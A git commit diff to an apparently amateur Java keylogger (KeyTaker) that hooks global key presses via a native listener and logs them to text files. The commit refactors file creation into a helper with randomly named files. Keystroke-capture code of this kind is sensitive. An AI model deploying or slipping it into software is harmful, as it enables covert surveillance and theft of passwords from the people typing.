0d460e556342655c19688cf4481793a85fafdcd5
Menge456 <menge456123@gmail.com>
2021-08-01 11:17:22 -0400

    Fixed Key Name src

--- KeyStrokes/src/KeyTaker.java
+++ KeyStrokes/src/KeyTaker.java
@@ -4,8 +4,7 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.util.Scanner;
-import java.math.BigInteger;
-import java.util.Random;
+
 
 import java.util.logging.Level;
 import java.util.logging.LogManager;
@@ -27,35 +26,15 @@ public class KeyTaker implements NativeKeyListener {
 	//need to put fw outside of try catch 
 	PrintWriter pw;
 	Scanner sc;
-	Random rnd = new Random();
 	
 	
 	static int times = 0;
-	BigInteger files = new BigInteger(30, rnd);
+	char[] files = new char[3];
 	
 	//OPEN A FILE
 	public KeyTaker() throws IOException {
-		file = new File("Keys" + files.toString() + ".txt");
-		file.createNewFile();
-		// 2) FileWriter
-		fw = null;
-		try {
-			fw = new FileWriter(file);
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-		//3) PrintWriter
-		pw = new PrintWriter(fw);
-		//need to put fw outside of try catch 
-		sc = null;
-		try {
-			sc = new Scanner(file);
-		} catch (FileNotFoundException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-			
-		}
+		
+		setNewFile();
 	}
 	
 	public void nativeKeyPressed(NativeKeyEvent e) {
@@ -66,9 +45,8 @@ public class KeyTaker implements NativeKeyListener {
 			
 		
 		times++;
-		if(times >= 200) {
-			times = times%10;
-			files.add(new BigInteger("1"));
+		if(times >= 20) {
+			times = 0;
 			
 			//closing scanner and filewriter
 			try {
@@ -82,31 +60,11 @@ public class KeyTaker implements NativeKeyListener {
 			
 			
 			//setting up next file name and new file
-			String name = "keys" + files + ".txt";
-			file = new File(name);
 			try {
-				file.createNewFile();
+				setNewFile();
 			} catch (IOException e1) {
 				// TODO Auto-generated catch block
 				e1.printStackTrace();
-			}
-			pw = new PrintWriter(fw);
-			// setting up new FileWriter
-			fw = null;
-			try {
-				fw = new FileWriter(file);
-			} catch (IOException a) {
-				// TODO Auto-generated catch block
-				a.printStackTrace();
-			}
-			
-			//New Scanner
-			sc = null;
-			try {
-				sc = new Scanner(file);
-			} catch (FileNotFoundException i) {
-				// TODO Auto-generated catch block
-				i.printStackTrace();	
 			}
 			
 		}
@@ -153,5 +111,35 @@ public class KeyTaker implements NativeKeyListener {
 		}
 
 		GlobalScreen.addNativeKeyListener(new KeyTaker());
+	}
+	public void setNewFile() throws IOException {
+		for(int i = 0; i < 3; i++) {
+			files[i] = (char) ((Math.random() * 65534 ) + 1);
+			System.out.println(files[i]);
+			
+		}
+		
+		file = new File("Keys" + files[0] + files[1] + files[2] + ".txt");
+		file.createNewFile();
+		// 2) FileWriter
+		fw = null;
+		try {
+			fw = new FileWriter(file);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		//3) PrintWriter
+		pw = new PrintWriter(fw);
+		//need to put fw outside of try catch 
+		sc = null;
+		try {
+			sc = new Scanner(file);
+		} catch (FileNotFoundException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+			
+	
+		}
 	}
 }
